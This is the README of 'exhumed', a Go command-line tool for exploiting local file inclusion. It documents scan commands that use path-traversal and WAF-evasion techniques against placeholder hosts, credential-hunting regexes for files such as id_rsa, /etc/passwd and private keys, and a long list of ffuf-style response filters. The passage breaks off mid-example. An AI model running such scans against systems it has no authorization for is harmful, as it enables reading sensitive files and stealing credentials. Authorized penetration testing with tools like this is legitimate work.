# exhumed

> *Some files don't stay buried.*

Modern LFI exploitation CLI and a revival of the abandoned `panoptic`.
Point it at a vulnerable parameter and it walks a curated database of
high-value file paths to find what's readable and extract content for
follow-on targeting...

---

> **LEGAL / ETHICAL USE NOTICE**
>
> `exhumed` is for **authorized security testing and bug bounty work only**.
> Using it against systems you do not have explicit, written permission to test
> is **illegal** and may violate computer fraud laws in your jurisdiction.
> You are solely responsible for ensuring your use complies with applicable law
> and the scope of any authorization you hold.
> The authors accept no liability for misuse.

---

## Status

**Under active development — pre-v1.0.** APIs and output formats may change
between packets. Do not depend on stability yet.

---

## Build from source

Requires Go 1.26+. No cgo. Produces a single static binary.

```bash
git clone https://github.com/bugsyhewitt/exhumed.git
cd exhumed

# plain build (version = dev)
CGO_ENABLED=0 go build -o exhumed ./cmd/exhumed

# release build with version metadata
CGO_ENABLED=0 go build \
  -ldflags "-X github.com/bugsyhewitt/exhumed/internal/version.Version=0.1.0 \
            -X github.com/bugsyhewitt/exhumed/internal/version.Commit=$(git rev-parse --short HEAD) \
            -X github.com/bugsyhewitt/exhumed/internal/version.Date=$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
  -o exhumed ./cmd/exhumed
```

---

## Usage (Packet 01 — evolving)

### `scan`

Fire traversal payloads at a vulnerable parameter. The URL must contain the
injection marker (default `FUZZ`):

```bash
# Basic scan against query parameter
exhumed scan --url "http://target.local/?file=FUZZ"

# POST body injection
exhumed scan --url "http://target.local/load" \
             --method POST \
             --data "path=FUZZ"

# Header injection
exhumed scan --url "http://target.local/read" \
             -H "X-Include-File: FUZZ"

# Cookie injection
exhumed scan --url "http://target.local/view" \
             -b "lfi_path=FUZZ"

# JSON body injection
exhumed scan --url "http://target.local/api/file" \
             --method POST \
             --data '{"path":"FUZZ"}' \
             -H "Content-Type: application/json"

# Tune concurrency, rate, and depth
exhumed scan --url "http://target.local/?file=FUZZ" \
             --concurrency 20 \
             --rate 50 \
             --traversal-depth 12 \
             --timeout 15s

# Verbose output (shows injection surface and payload preview)
exhumed scan --url "http://target.local/?file=FUZZ" --verbose

# Route through Burp Suite
exhumed scan --url "http://target.local/?file=FUZZ" \
             --proxy http://127.0.0.1:8080 \
             --insecure
```

### Selecting traversal techniques (WAF evasion)

By default `scan` fires every traversal/encoding technique it knows, ordered
most-to-least likely to succeed. When a target sits behind a WAF or an input
filter, you often want to either focus on the encodings that slip past that
specific filter or skip the noisy ones to cut request volume. `--techniques`
takes a comma-separated allowlist:

```bash
# Only the WAF-evasion encodings (mixed double-encoding, overlong slash,
# encoded backslash, dot-slash prefix, interstitial null)
exhumed scan --url "http://target.local/?file=FUZZ" \
             --techniques waf-double-slash,waf-overlong-slash,waf-encoded-backslash

# A single high-signal technique for a quick check
exhumed scan --url "http://target.local/?file=FUZZ" --techniques dotdot-slash

# List every available technique name, then exit
exhumed scan --url "http://target.local/?file=FUZZ" --techniques list
```

Available techniques fall into three groups:

| Group | Techniques |
|-------|-----------|
| Plain / encoded | `dotdot-slash`, `dotdot-backslash`, `dotdotdotdot-doubleslash`, `url-encoded`, `url-encoded-dots`, `url-encoded-slash`, `double-url-encoded`, `overlong-utf8`, `unicode-fullwidth`, `null-byte-percent`, `null-byte-raw`, `absolute-path` |
| WAF evasion | `waf-double-slash`, `waf-overlong-slash`, `waf-encoded-backslash`, `waf-dotslash-prefix`, `waf-null-interstitial` |
| Wrappers | `php-filter`, `file-uri` |

An unknown technique name is rejected with a clear error; an empty `--techniques`
(the default) means "use all". The selection preserves the generator's
most-to-least-likely ordering regardless of the order you list names in.

### Resumable scans

A full scan over a large database × many traversal techniques × traversal depth
is thousands of requests. If you Ctrl-C, hit a rate limit, or the target flaps,
`--resume` lets you pick up where you left off instead of re-hammering the target
from scratch — a scan-time *and* stealth win.

```bash
# Persist per-entry progress to a state file. Run it, interrupt it (Ctrl-C),
# then run the exact same command again — already-attempted entries are skipped
# and prior confirmed hits are replayed in the summary.
exhumed scan --url "http://target.local/?file=FUZZ" --resume scan.state

# Same command resumes; new run only scans what wasn't attempted yet.
exhumed scan --url "http://target.local/?file=FUZZ" --resume scan.state
```

The state file is bound to the `(target, marker, database)` triple it was created
against. Resuming with a different target, marker, or database is **refused**
(fail-closed) — otherwise the skip-set would silently hide entries that were never
actually attempted against the current scan. Delete the file to start fresh. State
is flushed atomically after every entry, so an interrupted scan never corrupts it.

### Redirect handling

By default `scan` does **not** follow `3xx` redirects: the redirect response is
reported verbatim, preserving the original status code and `Location` header.
This is the correct default for a fuzzer — a vulnerable parameter that responds
`302 → /login` must not be reported as the login page's `200`, which would both
hide the real status and risk a false-positive confirmation against the login
page body. Not following also halves request volume on redirect-heavy targets.

When you genuinely want to land on the redirect target — for example the file is
served behind a redirect, or you are following an auth flow — opt in with
`--follow-redirects`:

```bash
# Default: a 302 is reported as a 302 (Location preserved, target NOT fetched)
exhumed scan --url "http://target.local/?file=FUZZ"

# Follow redirects to the final response (up to Go's default redirect cap)
exhumed scan --url "http://target.local/?file=FUZZ" --follow-redirects
```

### Scanning a custom wordlist (SecLists interop)

The curated database is the moat, but sometimes you have a target-specific or
community wordlist of candidate paths (a SecLists LFI list, paths harvested from
recon, an app's known config locations). `--paths-file` scans those paths
*alongside* the curated database, fed through the same traversal engine.

```bash
# Scan the curated database AND every path in the wordlist
exhumed scan --url "http://target.local/?file=FUZZ" \
             --paths-file ./SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
```

Wordlist format (matches SecLists and similar lists):

- one candidate file path per line
- blank lines are skipped
- lines starting with `#` are treated as comments
- duplicate paths are de-duplicated (first occurrence wins)

Each path becomes a synthetic entry with a *weak confirm* — any readable, non-
trivial `2xx` body counts as a hit — and the parser is inferred from the path
(`.env`/`.ini`/`.conf` → config, `passwd` → unix-passwd, `id_rsa` → ssh-key,
`environ` → proc-environ, otherwise generic secret scraping). The curated
database always runs first; the wordlist purely extends coverage. A missing or
unreadable wordlist file is a hard error, so you never silently scan the curated
set only. Combine with `--techniques` to keep request volume sane on large lists.

#### Appending extensions (`--extensions`)

Many discovery wordlists list *base* names without a file extension (`config`,
`admin`, `backup`, `wp-config`) because the live extension depends on the stack.
`--extensions` is the `ffuf -e` workflow: append one or more extensions to every
`--paths-file` entry so a single base name fans out into the variants worth
trying.

```bash
# Scan each wordlist path AND its .php / .bak / .old variants
exhumed scan --url "http://target.local/?file=FUZZ" \
             --paths-file ./names.txt \
             --extensions .php,.bak,.old
```

A line `config` with `--extensions .php,.bak,.old` scans `config`, `config.php`,
`config.bak`, and `config.old`. The leading dot is optional (`php` and `.php`
are equivalent), case is preserved (paths are case-sensitive), and the bare path
is always scanned first followed by each variant in the order you listed them.
Variants that collide with another path already in the run are de-duplicated, so
no path is fired twice.

`--extensions` only applies to `--paths-file` entries — appending an extension to
the curated database's absolute paths (`/etc/passwd.php`) is nonsense, so passing
`--extensions` without `--paths-file` is a hard error. A malformed extension (one
containing whitespace or a path separator, or a bare `.`) is rejected before any
request fires.

### Filtering response-size noise (`--filter-size`)

Many web apps return a *fixed-size* "file not found" page (a soft-404 template, a
WAF block page, a framework error view) for every path that does not exist. Those
uniform responses flood the unconfirmed `[responded]` output and bury the signal.

`--filter-size` is the classic `ffuf`/`gobuster` `-fs` workflow: name the byte
length(s) of the known noise and exhumed drops responses of exactly those sizes
from the `[responded]` stream. The spec is comma-separated and accepts both exact
sizes and inclusive ranges:

```bash
# Drop the 1234-byte soft-404 page and any empty (0-byte) bodies
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-size 0,1234

# Drop anything in the 100–200 byte noise band, plus the exact 1234-byte page
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-size 100-200,1234
```

This only quiets *unconfirmed* noise — it is a finer scalpel than `--only-hits`,
which silences every non-hit wholesale. **Confirmed hits are never filtered:**
confirmation in exhumed is content-based (the body satisfies an entry's confirm
block), so a real file surfaces regardless of its size, even if that size is in
your `--filter-size` spec. A malformed spec (non-numeric, negative, or a reversed
range like `200-100`) is a hard error before any request fires.

### Filtering response-status noise (`--filter-code`)

Some apps don't return a fixed-size miss page but a *fixed status code*: a hard
`404` for every non-existent file, a WAF `403`, a `500` from a crashing include
sink, or a `302` redirect to a login page. `--filter-code` is the status-code
companion to `--filter-size` — the classic `ffuf -fc` / `feroxbuster
--filter-status` workflow. Name the HTTP status code(s) of the known noise and
exhumed drops responses with exactly those codes from the `[responded]` stream.
The spec is comma-separated and accepts both exact codes and inclusive ranges
(valid codes are `100`–`599`):

```bash
# Drop the 404 miss noise and the WAF 403s
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-code 404,403

# Drop every 4xx, plus the login-redirect 302
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-code 302,400-499
```

`--filter-code` composes with `--filter-size`: a response is suppressed if
*either* filter matches it, so you can quiet both a soft-404's size and a hard
404's status in one scan. Like `--filter-size`, it only quiets *unconfirmed*
noise. **Confirmed hits are never filtered:** confirmation is content-based and
requires a `2xx` read, so a real file surfaces regardless of any code you list.
A malformed spec (non-numeric, out of the `100`–`599` range, or a reversed range
like `499-400`) is a hard error before any request fires.

### Filtering response-body noise (`--filter-regex`)

The trickiest miss pages share neither a fixed size nor a fixed status: a soft-404
HTML template whose length wobbles with the requested path, a framework error
page served with a `200`, or a WAF challenge — all of which slip past
`--filter-size` and `--filter-code` but share a recognisable *phrase*.
`--filter-regex` is the body-content companion to those two — the classic
`ffuf -fr` (filter-regex) workflow. Give it a single Go (RE2) regex; any
unconfirmed response whose body matches is dropped from the `[responded]` stream.
The match is an unanchored "contains" match, so a bare phrase is enough (use `^`
and `$` to anchor to the whole body):

```bash
# Drop every response whose body contains the soft-404 banner
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-regex 'Not Found'

# Case-insensitive WAF challenge page
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-regex '(?i)access denied'
```

`--filter-regex` composes with `--filter-size` and `--filter-code`: a response is
suppressed if *any* of the three matches it, so you can quiet a soft-404 by phrase,
a hard 404 by status, and a fixed error page by size in one scan. Like the others,
it only quiets *unconfirmed* noise. **Confirmed hits are never filtered:**
confirmation is content-based and requires a `2xx` read, so a real file surfaces
regardless of any pattern you supply. A malformed regex is a hard error before any
request fires.

### Filtering response-time noise (`--filter-time`)

Sometimes the noise has neither a fixed size, status, nor phrase — but it *is*
distinguishable by timing. A reverse-proxy or WAF returns its uniform block /
soft-404 page from cache almost instantly, while a genuine file read touches disk
and takes measurably longer; or a slow upstream times out near the deadline and
floods output with uniformly slow non-hits. `--filter-time` is the round-trip-time
companion to the other filters — the classic `ffuf -ft` workflow. Each term is a
comparator (`>`, `>=`, `<`, `<=`) followed by a Go duration literal (`ns`, `us`,
`ms`, `s`, `m`, `h`); an unconfirmed response is dropped if it satisfies *any*
term:

```bash
# Drop the instant cache/WAF noise — keep only responses that took real work
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-time '>5ms'

# Band-stop: suppress the very fast (<5ms) AND the very slow (>2s),
# keeping the middle band where genuine reads land
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-time '<5ms,>2s'
```

A bare number with no comparator is rejected — timing filters are directional, so
you must say which side is noise. `--filter-time` composes with `--filter-size`,
`--filter-code`, `--filter-regex`, `--filter-words`, and `--filter-lines`: a
response is suppressed if *any* of them matches it. Like the others, it only
quiets *unconfirmed* noise.
**Confirmed hits are never filtered:** a real file surfaces regardless of how fast
or slow it responded. A malformed spec (missing comparator, bad duration, or a
negative threshold) is a hard error before any request fires.

### Filtering response-word-count noise (`--filter-words`)

Byte-size filtering is brittle when the soft-404 / WAF block page embeds a
per-request *varying* token — a request ID, a timestamp, a CSRF nonce, a cache
buster. The body length then wobbles by a few bytes on every request, so a fixed
`--filter-size` misses most of the noise. The *word count*, though, stays
constant across those variants: only the content of one token changes, not the
token count. `--filter-words` is the word-count companion to `--filter-size` —
the classic `ffuf -fw` workflow. Name the word count(s) of the known noise and
exhumed drops responses with exactly that many whitespace-separated words:

```bash
# The "file not found" page is always 42 words even though its byte length
# drifts (it stamps a request ID) — pin it by word count, not size
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-words 42

# Comma-separated exact counts and/or inclusive ranges
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-words 0,42,10-20
```

Word count is defined exactly as `ffuf` and Go's `strings.Fields` define it: the
number of maximal runs of non-whitespace characters (an empty body is zero
words). `--filter-words` composes with `--filter-size`, `--filter-code`,
`--filter-regex`, `--filter-time`, and `--filter-lines`: a response is suppressed
if *any* of them matches it. Like the others, it only quiets *unconfirmed* noise.
**Confirmed hits are never filtered:** a real file surfaces regardless of its
word count. A malformed spec (non-numeric, negative, or a reversed range) is a
hard error before any request fires.

### Filtering response-line-count noise (`--filter-lines`)

Word-count filtering still misses a soft-404 whose varying token is itself
*multi-word* — an echoed query string, a `Request: GET /…` line, a stack-frame
summary. Then both the byte length *and* the word count wobble per request, so
`--filter-size` and `--filter-words` both miss it. The *line count*, though,
stays constant: the noise template always has the same number of lines, only the
content of one line changes. `--filter-lines` is the line-count companion to
`--filter-words` — the classic `ffuf -fl` workflow. Name the line count(s) of the
known noise and exhumed drops responses with exactly that many lines:

```bash
# The block page is always 5 lines even though its byte length and word count
# both drift (it echoes the request line) — pin it by line count
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-lines 5

# Comma-separated exact counts and/or inclusive ranges
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-lines 0,5,10-20
```

Line count is defined exactly as `ffuf` defines its "Lines" metric: the number of
newline (`\n`) characters in the body. A body with no trailing newline does not
count its final fragment as a line, and `\r\n` (CRLF) counts as one line because
only the `\n` is counted (an empty body is zero lines). `--filter-lines` composes
with `--filter-size`, `--filter-code`, `--filter-regex`, `--filter-time`, and
`--filter-words`: a response is suppressed if *any* of them matches it. Like the
others, it only quiets *unconfirmed* noise. **Confirmed hits are never filtered:**
a real file surfaces regardless of its line count. A malformed spec (non-numeric,
negative, or a reversed range) is a hard error before any request fires.

### Filtering response-header noise (`--filter-headers`)

Every `--filter-*` flag so far inspects the response *body* (or its derived
length, word count, line count), its *status*, or its *latency*. None of them
touch the **response header block** — and that is exactly the surface where a
soft-404/WAF/CDN page often reveals itself most reliably. A CDN may stamp every
miss with `X-Cache: HIT` and a fixed `Server: cloudflare` banner; a framework's
"not found" template may always be `Content-Type: text/html` where a leaked file
would sniff to `text/plain`; an app may carry an `X-Powered-By` on its error page
that real file reads do not. When the noise body's length, word count, and status
all drift per request — defeating `--filter-size`, `--filter-words`, and
`--filter-code` — its header signature frequently stays constant.
`--filter-headers` names that signature and drops it. It is the **negative twin**
of `--match-headers`.

The flag is repeatable; each value is one `Header-Name: regex` rule (an RE2
"contains" match against the header value; the header name is case-insensitive):

```bash
# Drop every response a CDN short-circuited with an X-Cache: HIT
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-headers 'X-Cache: HIT'

# Drop the framework soft-404 template by its constant Content-Type
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-headers 'Content-Type: text/html'
```

When more than one rule is supplied they compose as a **disjunction** — a
response is suppressed if **any** rule matches — the deliberate opposite of
`--match-headers`'s conjunction. (For suppression you want "drop if it looks like
*any* known-noise signature"; for keeping you want "show only if it satisfies
*every* signal requirement.")

```bash
# Drop responses that are EITHER a cloudflare miss OR a PHP error page
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-headers 'Server: cloudflare' \
             --filter-headers 'X-Powered-By: PHP'
```

A header that is absent never satisfies its rule. `--filter-headers` composes
with `--filter-size`, `--filter-code`, `--filter-regex`, `--filter-time`,
`--filter-words`, and `--filter-lines`: a response is suppressed if *any* of them
matches it. Like the others, it only quiets *unconfirmed* noise. **Confirmed hits
are never filtered:** a real file surfaces regardless of its header block. A
malformed rule (missing colon, empty header name, or an uncompilable regex) is a
hard error before any request fires.

### Filtering HTML title noise (`--filter-title`)

The `--filter-*` flags so far inspect the body, its derived length / word /
line counts, the status, the latency, or the response headers. None of them
pin to the **HTML `<title>` element** — and that is the single surface on which
many HTML-rendered web apps stamp their soft-404 / 403 noise most cleanly. A
framework's "file not found" template typically carries a constant
`<title>404 Not Found</title>`; a 403 page is `<title>Access denied</title>`
or `<title>Forbidden</title>`. When the noise body's length, word count,
status, and header block all drift per request — defeating
`--filter-size`, `--filter-words`, `--filter-code`, and `--filter-headers` —
its title is still a single constant string. `--filter-title` names that
string and drops it. It is the **negative twin** of `--match-title`.

The flag is repeatable; each value is one Go (RE2) regex applied as an
unanchored "contains" match against the extracted title (entity-decoded,
whitespace-collapsed — the same extractor `--match-title` uses):

```bash
# Drop the generic "404 Not Found" template
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-title '404 Not Found'

# Drop every WAF/403 page in one go (case-insensitive alternation)
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-title '(?i)access denied|forbidden'
```

When more than one regex is supplied they compose as a **disjunction** — a
response is suppressed if **any** regex matches the extracted title — the
deliberate opposite of `--match-title`'s conjunction. (For suppression you
want "drop if it looks like *any* known-noise title"; for keeping you want
"show only if it satisfies *every* signal requirement.")

```bash
# Drop a response if its title looks like EITHER known noise template
exhumed scan --url "http://target.local/?file=FUZZ" \
             --filter-title '404 Not Found' \
             --filter-title '(?i)access denied'
```

A body whose response carries no extractable `<title>` element is **not**
suppressed — the operator opted in to a title suppressor, so a body that has
no title to inspect cannot be classified as title-shaped noise. (If you want
to drop titleless bodies too, pair this with `--match-title` or another
`--filter-*` gate.) `--filter-title` composes with `--filter-size`,
`--filter-code`, `--filter-regex`, `--filter-time`, `--filter-words`,
`--filter-lines`, and `--filter-headers`: a response is suppressed if *any* of
them matches it. Like the others, it only quiets *unconfirmed* noise.
**Confirmed hits are never filtered:** a real file surfaces regardless of the
HTML chrome its body is rendered inside (a leaked `/etc/passwd` served
through the same `<title>404 Not Found</title>` template still reports). An
empty spec keeps everything (no-op); an unparsable regex is a hard error
before any request fires.

### Keeping only interesting responses (`--match-regex`)

The seven `--filter-*` flags above are *negative* — they say what to throw away.
`--match-regex` is their *positive* twin: it says what to keep. Instead of naming
the noise, name the signal — a single Go (RE2) regex; an unconfirmed response is
kept **only** if its body matches, and every non-matching response is dropped.
This is the classic `ffuf -mr` (match-regex) workflow, the inverse of
`--filter-regex` (`ffuf -fr`). It is ideal for recon against a large
`--paths-file` wordlist where you only care about pages that mention a secret-ish
marker:

```bash
# Keep only unconfirmed responses whose body mentions a password
exhumed scan --url "http://target.local/?file=FUZZ" \
             --paths-file seclists/Discovery/Web-Content/common.txt \
             --match-regex 'password'

# Case-insensitive: keep anything that smells like a credential or key
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-regex '(?i)secret|api[_-]?key|BEGIN [A-Z ]+PRIVATE KEY'
```

The match gate runs **first** — it narrows the haystack to interesting bodies —
and the `--filter-*` suppressors then prune residual noise from the kept set, so
the two compose cleanly (e.g. `--match-regex 'password' --filter-regex
'(?i)reset your password'` keeps password mentions but still drops the generic
"reset your password" page). Like the filters, `--match-regex` only governs the
*unconfirmed* stream. **Confirmed hits are always reported regardless of whether
they match** — a real file read surfaces even if its body doesn't mention your
recon pattern. An empty spec keeps everything (no-op); a malformed regex is a hard
error before any request fires.

### Keeping only interesting status codes (`--match-code`)

`--match-code` is the status-code sibling of `--match-regex` and the *positive*
twin of `--filter-code`: instead of naming the noise code, name the signal code.
An unconfirmed response is kept **only** if its HTTP status is in the allowlist,
and every other status is dropped. This is the classic `ffuf -mc` (match-code)
workflow, the inverse of `--filter-code` (`ffuf -fc`). The spec grammar matches
`--filter-code` exactly — comma-separated exact codes and/or inclusive ranges in
`100`–`599`:

```bash
# Keep only responses where the include() sink crashed (5xx) — a strong LFI tell
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-code 500-599

# Keep only 200s and 500s, dropping the uniform 404/403 noise
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-code 200,500
```

The two positive match gates **compose as a conjunction**: with both
`--match-code` and `--match-regex` active, an unconfirmed response is kept only if
its status is allowlisted **and** its body matches the regex. Both gates run
**before** the `--filter-*` suppressors, which then prune residual noise from the
kept set. Like the other gates, `--match-code` only governs the *unconfirmed*
stream — **confirmed hits are always reported regardless of their status code**.
An empty spec keeps everything (no-op); a non-numeric, out-of-range, or reversed
spec is a hard error before any request fires.

### Keeping only interesting response sizes (`--match-size`)

`--match-size` is the response-size sibling of `--match-regex`/`--match-code` and
the *positive* twin of `--filter-size`: instead of naming the noise byte length,
name the signal length. An unconfirmed response is kept **only** if its body
length is in the allowlist, and every other size is dropped. This is the classic
`ffuf -ms` (match-size) workflow, the inverse of `--filter-size` (`ffuf -fs`). The
spec grammar matches `--filter-size` exactly — comma-separated exact byte lengths
and/or inclusive ranges:

```bash
# Keep only responses in the size band where leaked file content lands,
# dropping the uniform soft-404 template that floods every miss
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-size 400-9000

# Keep only zero-length and a single distinctive size, dropping the rest
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-size 0,1734
```

All three positive match gates **compose as a conjunction**: with
`--match-size`, `--match-code`, and `--match-regex` active, an unconfirmed
response is kept only if its body length is allowlisted **and** its status is
allowlisted **and** its body matches the regex. The match gates run **before**
the `--filter-*` suppressors, which then prune residual noise from the kept set.
Like the other gates, `--match-size` only governs the *unconfirmed* stream —
**confirmed hits are always reported regardless of their body length**. An empty
spec keeps everything (no-op); a non-numeric, negative, or reversed spec is a
hard error before any request fires.

### Keeping only interesting response times (`--match-time`)

`--match-time` is the response-time sibling of
`--match-regex`/`--match-code`/`--match-size` and the *positive* twin of
`--filter-time`: instead of naming the noise latency band, name the signal band.
An unconfirmed response is kept **only** if its round-trip time satisfies a
comparator bound, and every other response is dropped. This is the classic
`ffuf -mt` (match-time) workflow, the inverse of `--filter-time` (`ffuf -ft`). The
spec grammar matches `--filter-time` exactly — comma-separated `>`/`>=`/`<`/`<=`
comparators plus a Go duration literal:

```bash
# Keep only the slow minority: a genuine include() touches disk and is
# measurably slower than the uniform sub-millisecond cache/WAF soft-404
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-time '>50ms'

# Keep the very slow OR the very fast, dropping the uniform middle band
# (any bound satisfied keeps the response)
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-time '>1s,<5ms'
```

A bare number with no comparator is rejected — timing gates are directional, so
you must say which side is interesting. All four positive match gates **compose
as a conjunction**: with `--match-time`, `--match-size`, `--match-code`, and
`--match-regex` active, an unconfirmed response is kept only if its round-trip
time satisfies a bound **and** its body length is allowlisted **and** its status
is allowlisted **and** its body matches the regex. The match gates run **before**
the `--filter-*` suppressors, which then prune residual noise from the kept set.
Like the other gates, `--match-time` only governs the *unconfirmed* stream —
**confirmed hits are always reported regardless of how fast or slow they
responded**. An empty spec keeps everything (no-op); a missing comparator, bad
duration, or negative threshold is a hard error before any request fires.

### Keeping only interesting response word counts (`--match-words`)

`--match-words` is the word-count sibling of
`--match-regex`/`--match-code`/`--match-size`/`--match-time` and the *positive*
twin of `--filter-words`: instead of naming the noise word count, name the signal
count. An unconfirmed response is kept **only** if its body word count is in the
allowlist, and every other response is dropped. This is the classic `ffuf -mw`
(match-words) workflow, the inverse of `--filter-words` (`ffuf -fw`). The spec
grammar matches `--match-size` exactly — comma-separated exact counts and/or
inclusive ranges:

```bash
# Keep only bodies whose word count lands where leaked file content does,
# dropping the uniform soft-404 noise
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-words 200-9000

# Keep an empty include (0 words) OR a specific leaked-content count
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-words 0,317
```

`--match-words` is the word-count companion to `--match-size`: many soft-404 /
WAF templates embed a varying token — a request ID, a timestamp, a CSRF nonce —
so the body's *byte length* wobbles per request and `--match-size` cannot pin the
interesting body, but the *word count* stays constant because only one token's
content changes, not the token count. Word count is defined exactly as `ffuf`
defines it (whitespace-separated runs); the empty body counts as zero words. All
five positive match gates **compose as a conjunction**: with `--match-words`,
`--match-time`, `--match-size`, `--match-code`, and `--match-regex` active, an
unconfirmed response is kept only if its word count is allowlisted **and** its
round-trip time satisfies a bound **and** its body length is allowlisted **and**
its status is allowlisted **and** its body matches the regex. The match gates run
**before** the `--filter-*` suppressors, which then prune residual noise from the
kept set. Like the other gates, `--match-words` only governs the *unconfirmed*
stream — **confirmed hits are always reported regardless of their word count**.
An empty spec keeps everything (no-op); a non-numeric, negative, or reversed-range
term is a hard error before any request fires.

### Keeping only interesting response line counts (`--match-lines`)

`--match-lines` is the line-count sibling of
`--match-regex`/`--match-code`/`--match-size`/`--match-time`/`--match-words` and
the *positive* twin of `--filter-lines`: instead of naming the noise line count,
name the signal count. An unconfirmed response is kept **only** if its body line
count is in the allowlist, and every other response is dropped. This is the
classic `ffuf -ml` (match-lines) workflow, the inverse of `--filter-lines`
(`ffuf -fl`). The spec grammar matches `--match-size`/`--match-words` exactly —
comma-separated exact counts and/or inclusive ranges:

```bash
# Keep only bodies whose line count lands where leaked file content does,
# dropping the uniform soft-404 noise
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-lines 10-2000

# Keep a single-line include (0 lines, no terminator) OR a specific leaked count
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-lines 0,27
```

`--match-lines` is the line-count companion to `--match-size`/`--match-words`:
some soft-404 / WAF templates inject a *multi-word* varying fragment on a fixed
line — an echoed query string, a `Request: GET /…` line, a stack-frame summary —
so both the body's *byte length* and its *word count* wobble per request while the
*line count* stays constant, leaving `--match-size` and `--match-words` unable to
pin the interesting body. Line count is defined exactly as `ffuf` defines it: the
number of newline (`\n`) terminators, so a body with N newlines has N lines, a
CRLF body counts each `\r\n` once, and a single line with no trailing newline
counts as zero lines. All six positive match gates **compose as a conjunction**:
with `--match-lines`, `--match-words`, `--match-time`, `--match-size`,
`--match-code`, and `--match-regex` active, an unconfirmed response is kept only
if its line count is allowlisted **and** its word count is allowlisted **and** its
round-trip time satisfies a bound **and** its body length is allowlisted **and**
its status is allowlisted **and** its body matches the regex. The match gates run
**before** the `--filter-*` suppressors, which then prune residual noise from the
kept set. Like the other gates, `--match-lines` only governs the *unconfirmed*
stream — **confirmed hits are always reported regardless of their line count**.
An empty spec keeps everything (no-op); a non-numeric, negative, or reversed-range
term is a hard error before any request fires.

### Keeping only interesting response headers (`--match-headers`)

`--match-headers` is the **response-header** sibling of
`--match-regex`/`--match-code`/`--match-size`/`--match-time`/`--match-words`. It
inspects a surface none of the other matchers touch: the response *header block*.
When an LFI payload makes the target read and serve a real file, the headers
frequently shift in ways the body does not — a sniffed `Content-Type` flips from
`text/html` to `text/plain` or `application/octet-stream`, a
`Content-Disposition: attachment` appears, an `X-Powered-By` or `Server` banner
changes, a `Set-Cookie` shows up. `--match-headers` keeps **only** the
unconfirmed responses whose headers carry those signals and drops the uniform
soft-404 / WAF noise whose body, size, word count, and status are all
indistinguishable — but whose header block is not.

The flag is **repeatable**; each value is one `Header-Name: regex` rule. The
header name is matched case-insensitively (HTTP header names are
case-insensitive); the value side is a Go (RE2) "contains" match against each
value of that header. A rule is satisfied when the named header is present **and**
at least one of its values matches:

```bash
# Keep only responses the server served as plain text or a PHP source file —
# a strong signal an include was read raw rather than executed
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-headers 'Content-Type: text/(plain|x-php)'

# Keep only responses the server offered as a file download
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-headers 'Content-Disposition: attachment'
```

When more than one rule is supplied they **compose as a conjunction** — every
rule must match. This extends the family's conjunction semantics to headers: with
`--match-headers`, `--match-lines`, `--match-words`, `--match-time`,
`--match-size`, `--match-code`, and `--match-regex` active, an unconfirmed
response is kept only if its headers satisfy every rule **and** its line count is
allowlisted **and** its word count is allowlisted **and** its round-trip time
satisfies a bound **and** its body length is allowlisted **and** its status is
allowlisted **and** its body matches the regex:

```bash
# Both rules must match: a plain-text Content-Type AND a PHP X-Powered-By banner
exhumed scan --url "http://target.local/?file=FUZZ" \
             --match-headers 'Content-Type: text/plain' \
             --match-headers 'X-Powered-By: PHP'
```

There is no single `ffuf` flag for header matching — its matchers are
body/status/size/word/line oriented — so `--match-headers` is the header-surface
complement that rounds out the family for the LFI use case. The match gates run
**before** the `--filter-*` suppressors, which then prune residual noise from the
kept set. Like the other gates, `--match-headers` only governs the *unconfirmed*
stream — **confirmed hits are always reported regardless of their headers**. An
empty spec keeps everything (no-op); a rule missing its colon, with an empty
header name, or with an unparsable regex is a hard error before any request
fires.

### Keeping only interesting JSON bodies (`--match-body-json`)

`--match-body-json` is the **structured-JSON** sibling of `--match-regex`. Where
`--match-regex` runs an unanchored "contains" match against the *raw body bytes*,
`--match-body-json` parses the response as JSON and matches a regex against the
scalar value found at a **named path**. This matters because modern LFI targets
are frequently JSON APIs, not HTML pages: a vulnerable endpoint that wraps file
content in a JSON envelope (`{"ok":true,"content":"...file bytes..."}`) returns a
soft-404 as the **same envelope shape** with a different field value
(`{"ok":false,"error":"not found"}`). Those two responses can be byte-identical
to `--match-size` and word-count-brittle to `--match-words`, while a raw
`--match-regex` on the whole body is noisy — a regex meant for the `content`
field also fires if the same token appears in an `error` message or an echoed
request field. `--match-body-json` pins the match to **one field**, so the
cross-field false positives disappear.

The flag is **repeatable**; each value is one `json.path: regex` rule. The path
before the colon is **dot-separated**: each segment is an object key or a
non-negative array index. The value side is a Go (RE2) "contains" match against
the scalar value's string form — strings verbatim, booleans as `true`/`false`,
numbers naturally (`200`, `1.5`), and JSON `null` as the literal `null`. A rule
is satisfied when the path resolves to a **scalar** **and** the regex matches its
string form:

```bash
# Keep only responses whose JSON success flag is true
exhumed scan --url "http://target.local/api?file=FUZZ" \
